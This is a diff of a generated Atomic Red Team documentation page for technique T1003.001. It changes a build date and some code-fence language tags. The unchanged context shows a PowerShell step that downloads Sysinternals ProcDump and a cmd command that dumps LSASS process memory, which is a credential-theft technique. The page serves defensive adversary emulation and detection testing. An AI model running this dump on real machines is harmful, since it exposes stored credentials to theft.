@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1003.001"
 attack_technique_name: "OS Credential Dumping: LSASS Memory"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.yaml"
-build_date: "2026-04-26 14:38:39"
+build_date: "2026-04-26 17:02:12"
 executor: "command_prompt"
 aliases:
   - "7cede33f-0acd-44ef-9774-15511300b24b"
@@ -63,13 +63,13 @@ ProcDump tool from Sysinternals must exist on disk at specified location (#{proc
 
 ### Prerequisite Check
 
-```text
+```powershell
 if (Test-Path "#{procdump_exe}") {exit 0} else {exit 1}
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
 Invoke-WebRequest "https://download.sysinternals.com/files/Procdump.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\Procdump.zip"
 Expand-Archive "PathToAtomicsFolder\..\ExternalPayloads\Procdump.zip" "PathToAtomicsFolder\..\ExternalPayloads\Procdump" -Force
@@ -84,13 +84,13 @@ Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\Procdump\Procdump.exe" "#{pro
 
 ### Command
 
-```commandprompt
+```cmd
 "#{procdump_exe}" -accepteula -mm lsass.exe #{output_file}
 ```
 
 ### Cleanup
 
-```commandprompt
+```cmd
 del "#{output_file}" >nul 2> nul
 ```
 
